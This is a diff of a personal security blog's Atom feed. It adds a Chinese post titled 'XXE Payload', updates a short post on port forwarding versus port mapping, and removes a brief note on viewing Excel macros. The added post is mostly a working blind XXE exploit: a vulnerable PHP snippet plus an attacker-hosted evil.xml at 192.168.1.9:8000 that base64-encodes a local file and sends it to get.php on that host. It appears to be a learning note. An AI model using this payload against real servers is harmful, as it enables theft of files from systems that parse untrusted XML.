@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://duyana.top/"/>
-  <updated>2019-03-17T09:48:00.617Z</updated>
+  <updated>2019-09-22T08:17:15.694Z</updated>
   <id>http://duyana.top/</id>
   
   <author>
@@ -17,11 +17,35 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>XXE Payload</title>
+    <link href="http://duyana.top/post/7eb7e3d8/"/>
+    <id>http://duyana.top/post/7eb7e3d8/</id>
+    <published>2019-09-16T15:21:54.000Z</published>
+    <updated>2019-09-22T08:17:15.694Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#160; &#160; &#160;&#160;今天了解了一下XXE,记录一下盲注payload.</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>0.被攻击方对在漏洞的xml文件,这里直接写在php文件里了<br>xml.php</p><pre><code>&lt;?php  $xml=&lt;&lt;&lt;EOF&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpstudy/WWW/test.txt&quot;&gt; &lt;!ENTITY % xml SYSTEM &quot;http://192.168.1.9:8000/evil.xml&quot;&gt;%xml;%send;]&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt;</code></pre><p>1.攻击方服务器上的xml文件<br>evil.xml</p><pre><code>&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://192.168.1.9:8000/get.php?file=%file;&apos;&gt;&quot;&gt;%all;</code></pre><p>2.要读取的文件<br>C:/phpstudy/WWW/test.txt<br>3.攻击方开启一个http服务器,在get请求中就能看到想要读取的文件内容了,这里进行了base64加密(防止url被截断).</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;&amp;#160;今天了解了一下XXE,记录一下盲注payload.&lt;/p&gt;
+&lt;h2 id=&quot;payloa
+      
+    
+    </summary>
+    
+      <category term="web" scheme="http://duyana.top/categories/web/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>端口转发与端口映射</title>
     <link href="http://duyana.top/post/c9d3a0f1/"/>
     <id>http://duyana.top/post/c9d3a0f1/</id>
     <published>2019-03-17T15:22:54.000Z</published>
-    <updated>2019-03-17T09:48:00.617Z</updated>
+    <updated>2019-03-17T09:48:59.273Z</updated>
     
     <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#160; &#160; &#160;&#160;看过几次端口转发与端口映射的区别了，但是每次都是过几天就忘了，自己来简短的总结一下。</p><h2 id="端口转发与端口映射区别"><a href="#端口转发与端口映射区别" class="headerlink" title="端口转发与端口映射区别"></a>端口转发与端口映射区别</h2><p>端口转发：转发程序搭建在中间服务器上，你可以通过中间服务器去访问任何你想访问的资源(只要中间服务器能访问到)，就像科学上网用的代理，渗透测试中也可以用来更方便的探测内网(拿下一台内网主机时)。<br>端口映射：是否映射的决定权在自己主机，映射到中间服务器，任务人都可以通过中间服务器来访问到你。类似Teamviewer软件。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本质上都是端口之间的建立关联。</p>]]></content>
     
@@ -458,33 +482,6 @@
     </summary>
     
       <category term="c" scheme="http://duyana.top/categories/c/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>excel2007 .xlsm文件中查看宏代码</title>
-    <link href="http://duyana.top/post/bf1c2fd3/"/>
-    <id>http://duyana.top/post/bf1c2fd3/</id>
-    <published>2018-05-16T08:47:32.000Z</published>
-    <updated>2018-07-27T15:11:31.607Z</updated>
-    
-    <content type="html"><![CDATA[<ul><li>不能使用wps，wps需要插件才能查看宏代码。</li><li>视图—&gt;宏—&gt;查看宏(VBS代码)</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;ul&gt;
-&lt;li&gt;不能使用wps，wps需要插件才能查看宏代码。&lt;/li&gt;
-&lt;li&gt;视图—&amp;gt;宏—&amp;gt;查看宏(VBS代码)&lt;/li&gt;
-&lt;/ul&gt;
-
-      
-    
-    </summary>
-    
-      <category term="windows" scheme="http://duyana.top/categories/windows/"/>
     
     
   </entry>
